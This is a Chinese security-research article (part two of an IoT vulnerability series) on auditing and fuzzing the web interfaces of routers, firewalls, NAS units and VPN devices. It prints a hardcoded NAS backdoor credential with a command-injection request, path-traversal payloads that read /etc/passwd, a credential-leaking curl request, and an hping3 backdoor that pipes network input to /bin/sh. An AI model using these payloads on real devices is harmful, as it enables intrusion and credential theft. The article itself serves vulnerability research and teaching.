> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.freebuf.com](https://www.freebuf.com/articles/terminal/254258.html)

前情提要
----

> [IoT 漏洞研究（一）固件基础](https://www.freebuf.com/articles/terminal/254257.html)

路由器、防火墙、NAS 和摄像头等由于功能复杂，为方便交互一般都会提供 web 管理服务，和服务器 web 相比，IOT 的 web 功能较为简单，也就避免了一些复杂功能存在的漏洞，但是由于嵌入式设备的硬件瓶颈，设备自身的安全检测与防护能力有限，也就增加了其安全风险。

IoT Web 服务
----------

IOT web 常采用开源框架 + 自研模块的方式，漏洞特点也较为明显：

> (一) 自研 CGI 模块中存在漏洞的概率较高，漏洞差异性大  
> (二) 开源框架 (可能的) 漏洞广泛存在各种设备，漏洞同源性强

虽然具体漏洞存在差异，但常见的大致分为几类。

### 2.1 漏洞类型

#### 2.1.1 常见 web 漏洞

首先当然是弱口令，虽然在 IOT 攻击中比重较大但和用户设置相关，再次不做讨论。其次常见的 web 漏洞包括 sql 注入、xss、csrf、ssrf、xxe 等，由于挖掘和利用方法和服务器 web 基本相似，且在 IOT web 漏洞中占比不高，就不在赘述。唯一想强调的是路由器、防火墙等边界设备尤其要重视 ssrf 漏洞，不然很容易成为内网渗透的垫脚石。

#### 2.1.2 硬编码

硬编码是开发人员为了方便调试 (或其他某些原因) 在设备内部保留的后门，一般权限较高。有些服务的形式存在，比如某款路由器的 IGDMPTD 进程默认开启 53413 端口，连接就直接获取 root shell。

```
LOAD：004024B8              sw      $zero, 0x30+sock_addr($sp)
LOAD：004024BC              sw      $zero, 0x30+sock_addr.sin_zero($sp)
LOAD：004024C0              sw      $zero, 0x30+sock_addr.sin_zero+4($sp)
LOAD：004024C0+4            li      $v0, 2
LOAD：004024C8              sh      $v0, 0x30+sock_addr($sp)
LOAD：004024CC              li      $v0, 0xFFFFD0A5 # 0xd05a = 53413
LOAD：004024D0              sh      $v0, 0x30+sock_addr.sin_port($sp)
LOAD：004024D4              sw      $zero, 0x30+sock_addr.sin_addr($sp)


```

许多 IOT web 应用中也被发现存在硬编码后门，比如某款 NAS，以下是该 NAS 的 nas_sharing.cgi 的部分 IDA 伪代码：

```
struct passwd *__fastcall re_BACKDOOR(const char *a1, const char *a2)
{
    const char *v2; // r5@1
    const char *v3; // r4@1
    struct passwd *result; // r0@4
    FILE *v5; // r6@5
    struct passwd *v6; // r5@7
    {...}
    if (!strcmp(v3, "mydlinkBRionyg") 
    &&  !strcmp((const char *)&v9, "abc12345cba") )
    {
        result = (struct passwd *)1;
    }
    else
    {
    v5 = (FILE *)fopen64("/etc/shadow", "r");
    {...}
    if ( !strcmp(result->pw_name, v3) )
    {
        strcpy(&s, v6->pw_passwd);
        fclose(v5);
        strcpy(&dest, (const char *)&v9);
        v7 = (const char *)sub_1603C(&dest, &s);
        return (struct passwd *)(strcmp(v7, &s) == 0);
    }
    {...}
}


```

可以看出代码中包含了一个管理员凭据 (用户名 mydlinkBRionyg / 密码 abc12345cba)，代码中还使用了危险函数 strcpy，虽然在这个漏洞没有用到，结合硬编码可以构造命令注入数据实现设备的远程控制。

```
GET /cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlinkBRionyg&passwd=YWJjMT
IzNDVjYmE&start=1&count=1;{your cmd};


```

此种漏洞还是比较直观的，可以通过 (二进制) 代码审计找到，使用一些反汇编插可以提高挖掘效率，在后文我们会讨论到。

#### 2.1.2 信息泄漏

信息泄漏概念比较泛，完全杜绝很困难，一般只要出现对设备研究 (攻击) 有帮助的信息泄漏都会造成一定危害，不仅用户信息 (用户名、密码等)，二进制文件地址信息等较为敏感，http(s) 响应头中的某些字段、error、debug 等信息泄漏也同样能给攻击者带来帮助，从某些文件的 last_modified 时间能推算出固件版本，这些熟悉渗透测试的小伙伴应该比较了解。

```
# curl -d SERVICES=DEVICE.ACCOUNT http://{ip}/getcfg.php
<?xml version="1.0" encoding="utf-8"?>
    <postxml>
        <...>
        <uid>USR-</uid>
        <name>admin</name>
        <usrid></usrid>
        <password>admin1324</password>
        <...>
    </postxml>


```

#### 2.1.3 目录穿越

目录穿越是未设置访问边界，客户端可以越界访问到不该提供文件，一般会造成任意文件读漏洞。以下链接很好的介绍了常见的目录穿越漏洞点，有兴趣的小伙伴可以自行阅读。

> https://www.hackingarticles.in/comprehensive-guide-on-path-traversal/

目录穿越漏洞原理比较简单，但有时候也需要一些技巧。

*   某防火墙目录穿越漏洞，可获取配置文件等敏感信息

```
snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);


```

该防火墙在全球广泛应用，由于没有对 lang 变量过滤，造成了目录穿越读对漏洞，漏洞利用时还使用了一个技巧，即将 lang 长度扩充至 0x40，将 ".json" 字符串 “挤在”0x40 之外，由于 snprintf 的长度固定就突破了后缀名限制，poc 如下：

```
/lang migadmin/lang =/../../../..//////////////////////////////bin/sh //../../../..//////////////////////////////bin/sh.json


```

*   某 VPN 设备目录穿越漏洞，可获得获取用户登录凭据

```
/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/


```

该 VPN 设备也在全球广泛使用，漏洞原因是使用了 html5 新特性时没有对路径过滤，同时由于该 VPN 设备缓存中可能保留用户凭据和密码明文，就有很大概率拿到凭据绕过认证。

#### 2.1.4 注入

注入漏洞也是大家比较熟悉的，安全研究人员的职业病就是遇到输入的地方都忍不住试一试能不能执行命令，在某些弹幕里居然还有许多 alert 飘过~~~  
有输入的地方就有可能存在注入，一般命令注入和参数注入较为常见。

*   命令注入  
    命令注入一般是没有过滤用户输入内容，直接通过 system 等函数执行运行，只要在输入中加入 “;” 或者 "&&"，随后跟上要执行的命令，就可以完成注入。有些过滤不严格，通过一些技巧绕过也可达到相同效果，方法也和一般 web 渗透基本相同。

```
int __fast sub_9424(int port)
{
    int v1; // r5
    char s; // [sp+0h][bp-114h]
    
    v1 = port;
    memset(&s, 0, 0x100u);
    sprintf(&s, "lighty_ssl -p %s", v1);
    system(&s);
    return 0;
}


```

上面展示了某路由设备命令注入漏洞的部分代码，由于对用户输入 port 值缺少过滤，并直接用 system 执行造成了命令注入，诸如此类简单的注入漏洞通过反汇编脚本辅助可很快发现。

*   参数注入  
    稍微注重安全的厂商都会在设备中对用户输入做字符过滤，有的还十分严格，但往往忽略了应用参数。前面提到，设备应用了很多开源工具，有些开源工具功能强大，参数很多，但是在移植的时候开发者并没有修改代码，这样对开源工具自身功能的运用或者参数的覆盖也可以达到注入的目的。  
    有些设备会内置 ping/tarce/hping3 等功能，hping3 功能强大，我们比较熟悉的是网络联通探测和 Flood 攻击，但是往往会忽略 hping3 还有监听功能，在下面这篇文章中对其功能和技巧概括比较全面。

> https://medium.com/@iphelix/hping-tips-and-tricks-85698751179f

其中提到利用 hping3 的监听功能可以构造 backdoor，在设备端执行

```
hping3 -I eth1 -9 secret | /bin/sh


```

本地执行

```
hping3 -R 192.168.1.100 -e secret -E commands_file -d 100 -c 1


```

当设备受到的网路数据中包含 "secret" 关键字时就会执行 commands_file 文件中的 shell 命令。  
此外 hping3 还可以读取文件并发送，达到 SSRF 的效果，这里不再赘述，有兴趣的小伙伴可以具体查看其参数功能。

#### 2.1.4 内存溢出

相对于之前的几种漏洞，IOT web 中的溢出漏洞一般要结合二进制代码审计，常见于处理解析输入的位置。内存溢出漏洞发现比较容易，因为漏洞触发现象明显，往往会造成崩溃，利用方面比上述的漏洞稍复杂一些，需要二进制的基础。

*   解析参数

解析 http(s) 参数时可能会发生溢出问题，下面是某路由器的 http cgi 中部分解析代码：

```
{...}
__fd = fileno(__stream);
lockf(__fd,0,0);
fclose(__stream);
remove("/var/tmp/temp.xml");
uVar1 = sobj_get_string(iVar5);
sprintf(acStack1064, "/htdocs/webinc/fatlay.php\nprefix=%s/%s","/runtime/session"，uVar1);
xmldbc_ephp(0,0,acStack1064,stdout);
if (__fd_00 == 0) goto LAB_004099cc;
__s1 = (cahr *)0x0;
{...}


```

uVar1 是 HTTP_COOKIE 中 uid 的内容，由于未对其长度作限制，而 acStack1064 长度有限，就导致栈溢出。

*   解析 javascript

js 中不仅能找到 flag，还可能导致漏洞。某防火墙的 WebVPN 功能在解析 HTML 中的 JavaScript 时，服务器会尝试使用如下代码将内容拷贝到缓冲区中：

```
memcpy(buffer, js_buf, js_buf_len);


```

缓冲区大小固定为 0x2000，但输入字符串没有长度限制，就造成了堆溢出。  
IOT 设备溢出漏洞利用相对简单，在设备中使用 pwn checksec 会发现，为了节省资源程序一般没有开什么防护机制，基本处于 “裸奔” 状态。设备中的非 web 协议也会存在溢出等内存问题，会在之后的文章中作探讨。

### 2.2 研究方法

研究方法无非静态审计或者动态测试，利用一些插件工具辅助可以提高效率。

#### 2.2.1 静态分析

*   源代码审计

跟着代码逻辑一步一步往后看当然可以，但是费时费力不太现实，一般可都从危险函数入手，回溯其调用是否存在问题，危险函数一般包括 system 等可以执行命令的，strcpy/snprintf 等对内存或字符串操作的，还有回调类的等等，因不同编程语言而异。市面上有许多成熟的代码审计工具， 比较出名的 RIPS、Fortify SCA 等，网上教程很多，这里不再赘述。

*   二进制审计

现在的反汇编工具很强大，使得二进制审计和代码审计没有本质区别。方法也差不多是从危险函数和有输入交互的逻辑入手，再回溯其是否存在漏洞。推荐的一些 IDA 插件在之前固件分析篇已经列出，PAGalaxyLab 开源的一些 Ghidra 脚本也很值得借鉴。

> https://github.com/PAGalaxyLab/ghidra_scripts

利用插件可以直接将想要的函数列出便于审计：

![](https://image.3001.net/images/20201108/1604818943_5fa797ff80837d9b8c880.png!small)2.2.2 动态测试

##### 2.2.2.1 Scan

能用工具直接扫出来漏洞又何必自己动手挖，和研究传统的 web 相同，先利用 appscan、burpsuite 等工具扫描，虽然大概率扫不出来，但多少可以获得一些有用信息。

##### 2.2.2.2 fuzz

如果扫描工具效果一般，可以利用一些 fuzz 工具或者 fuzz 框架的自研代码进行测试，fuzz 针对的目标或者说要解决的问题有三个：

> (一) 有哪些可访问的页面 (位置)  
> (二) 这些页面 (位置) 的有哪些参数  
> (三) 在解析这些参数时可能出现的问题

fuzz 工具 (框架) 的选取根据自己的喜好，笔直以前会经常试用一些新的框架，时至今日 fuzz 工具 (框架) 已经数不过来，下面这个网站展示了常见的 fuzz 工具 (框架) 和关系图。  
https://fuzzing-survey.org/  
最简单的就是利用 burpsuite 的 intrude 功能，将参数内容设置为从字典中选取，通过返回 (大小) 判断是否找到了某些 bug。下面介绍笔者常用的一些 fuzz 工具。

*   wfuzz

wfuzz 是为了测试 web 应用安全性而生的 fuzz 工具，可利用给定的 Payload 去 fuzz。Payload 可以是参数、认证、表单、目录 / 文件、头部等等，这款工具在 kali 里面。  
比如想测试提交的 username=&password = 参数，可以使用如下命令：

```
wfuzz -w userList -w pwdList -d "user http://127.0.0.1/login.php


```

可以看到和之前提到的 burpsuite 的 intrude 功能很像。研究过 fuzz 的小伙伴知道，fuzz 一般基于生成或变异，这里基于字典，可以算是生成类型，所以能不能有所收获全看有没有好字典。当然 wfuzz 还有许多使用技巧，在 web 漏洞挖掘中十分强大，篇幅原因这里不再展开。

*   boofuzz

与 wfuzz 不同，boofuzz 是一个 python 的 fuzz 框架，其前身是 sulley。boofuzz 比较灵活，支持多种协议 fuzz，但需要开发者对所测试协议格式较为了解。

```
def define_proto_static(session):
    s_initialize()
    with s_block("Request-Line"):
        s_group("Method", ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE"])
        s_delim(" ", )
        s_string("/index.html", )
        s_delim(" ", )
        s_string("HTTP/1.1", )
        s_static("\r\n", )
        s_string("Host:", )
        s_delim(" ", )
        s_string("example.com", )
        s_static("\r\n", )
    s_static("\r\n", "Request-CRLF")


```

这是 boofuzz 测试 http 的示例的代码片段，可以看到 define_proto_static 函数在构造 http 协议请求格式，在每个位置都可以选择是运用固定字符串 (数字) 还是利用变异。

> 嵌入式 fuzz 的一个难点在于监视器，即发送 fuzz 数据后的异常状态检测。在设备端需要一个类似插桩的东西随时监测应用状态，在 x86(-64) 的 fuzz 中有许多这样的工具，但由于某些 IOT 设备自身限制，移植比较困难。如果只以程序是否奔溃为检测依据颗粒度过大，一般只能检测到内存奔溃漏洞，如果存在守护进程那效果更不明显，一般会采取如下方案：  
> (一) 利用 syslog 反馈，通过 dmesg 等日志信息检测程序异常，一般会将 debug 信息级别调制最高。  
> (二) 利用 gdb 调试监测，通过便携. gdbinit 脚本在 gdb 调试进程时检测所需状态。  
> (三) 利用模拟器模拟进程，通过 QEMU、unicorn、Qiling 等模拟设备文件，这些工具都提供了一些插桩功能。

当然还可以移植，虽然也可以直接做 IOT 架构下的二进制 fuzz，但是效率较低，可以结合模拟器，比如 Qiling，做一些尝试，最好还是在有代码的情况移植做 fuzz。  
以前做嵌入式开发，在 Golang 兴起前是想尽办法交叉编译，让程序移植到设备上能稳定运行；现在作安全研究，是想尽办法把设备程序移植到主机上运行，以利用主机 CPU 的运算能力提高 fuzz 效率，想想就让人不胜唏嘘。

*   Hongfuzz

> https://github.com/google/honggfuzz

Honggfuzz、AFL 和 libfuzzer 都由 Google 开发，是比较著名的三个基于代码覆盖率的 fuzzer。  
这里简单提及一下利用 Honggfuzz NetDriver 白盒 fuzz socket 类程序的方法，一般会将策划个女婿的 main 函数改为 HFND_FUZZING_ENTRY_FUNCTION，然后用 hfuzz-clang 编译， libhfnetdriver.a 链接即可。

```
int main(int argc, char *argv[]){
    {...}
}


```

改为

```
HFND_FUZZING_ENTRY_FUNCTION(int argc, char *argv[]){
    {...}
}


```

使用时执行以下命令，_HF_TCP_PORT 指定监听的端口，fuzzer 会和这个端口建立 tcp 连接，然后发送数据：

```
_HF_TCP_PORT=8888 honggfuzz -f input -- ./vuln


```

*   AFL(和其无数衍生工具)

> https://github.com/google/AFL

AFL 不用多说，网上的资料众多，利用 AFL 的 qemu 或 unicorn 模式可以对设备程序作黑盒 fuzz，虽然效率不高。AFL 的衍生工具有很多，简单列举两个和 web 相关的：  
AFLnet：AFL fuzz 网络协议版

> https://github.com/aflnet/aflnet

afl-cgi-wrapper：利用 AFL fuzz web CGI

> https://github.com/floyd-fuh/afl-cgi-wrapper

##### 3.2.2.3 动态调试

设备上的调试一般用 gdb，有条件上 python，装个 peda/gef/pwndbg 更好。笔者观点是有现成的 binary 就用，运行不了再自己交叉编译，github 上不乏编译好的 gdb static 文件，涵盖多种设备架构：

> https://github.com/hugsy/gdb-static

当然还可以用 IDA pro 远程 attach 进行调试，远程调试一般也是利用 gdbserver，本质上没有差别，有些情况下还可能出现崩溃，这个因设备而异。

### 2.3 研究流程

最后讨论下 IOT web 的研究流程，一般要通过信息收集，认证前分析，认证后分析几个步骤，下面列举一些基本的流程，欢迎小伙伴们一起探讨补充。

#### 2.3.1 信息收集

信息收主要是对设备信息作梳理，实际研究时不仅仅是 web 方面，本篇既然着重 IOT web 就先提供一些此方面的思路。

*   开源识别

通过设备解包或 web(错误) 返回信息等确认 web 框架，是否是 apache/ngnix/webapp 等开源框架，其版本具体信息是什么。如果不开源，那么之后的测试点又多了一项。

*   公开漏洞

设备 (web) 有哪些历史漏洞，厂商补丁是否完全有效；若框架开源，相应版本存在哪些漏洞，是否补上。

*   所有可访问链接 (位置)

通过固件提取等目录 (如果存在文件系统) 或者 Dirbuster/dirsearch 等工具探索 web 所有可以访问的链接和位置，这些链接 (位置) 有哪些参数。

*   未授权页面

这些 web 链接 (位置) 是否存在未授权就可以访问的页面。

*   所有功能 & 新特性

该设备具有哪些 (web) 功能，是否存在比较新或者实现功能复杂的特性(ssl-vpn/html5/guacamole / 云管理等等)

#### 2.3.2 认证前分析

认证前分析主要针对未授权就可以访问的页面 (位置)，同时对登录过程作一些分析。

*   工具扫描

在不提供登录凭据对情况下利用 appscan、burpsuite 等工具扫描，通过 IDA/ghidra(脚本) 查看 web 模块是否存在硬编码。

*   代码审计

分析未授权访问页面 (位置) 的实现模块，根据实际情况进行 (二进制) 代码危险函数审计，回溯是否可利用，可利用 IDA/ghidra(脚本)辅助，列出危险函数和其参数。

*   动态测试

分析 (或爆破) 页面 (位置) 可接受的参数，进行动态 fuzz。

*   登录绕过

分析登录实现模块，看有没直接绕过的可能性。

*   公开漏洞验证

如果存在公开漏洞，验证在设备上是否可以复现，还可以针对补丁的有效性作研究。

#### 2.3.3 认证后分析

认证后分析针对所有可以访问的位置，着重在有输入和提供参数的地方作研究。

*   工具扫描

提供登录凭据后利用 appscan、burpsuite 等工具扫描。

*   公开漏洞验证

同认证前分析。

*   验证输入

所有用户可以输入的位置，是否可以命令注入 / 参数注入，如果有过滤，是否可以绕过；利用 fuzz 工具探测入的位置是否存在内存溢出，当然也可以直接 (二进制) 代码审计。

*   功能参数

所有请求参数的内容是否可以注入，包括 http header 中的内容，可以通过脚本实现，也可以手动探测。

*   代码审计

同认证前分析。

*   升级模块

升级模块是否对升级包严格校验，升级等能上传文件的功能模块是否可以目录穿越。

*   权限提升

如果 web 功能存在漏洞但运行在低权限下，能否利用 rpc/socket/suid / 溢出等方法提权。

### 2.4 总结

IOT web 还是 web，对其安全研究本质上与传统 web 没什么不同。尤其有些设备未提供更好的服务在 web 上运用了较为复杂的功能，进一步增加的安全风险，也将 IOT web 研究和传统 web 拉的更近。但也可以看到 IOT web 也有其独有的特点，很多情况下更偏重多架构下的二进制分析。在下一篇中将会与大家一起探讨 IOT 漏洞研究硬件方面的内容。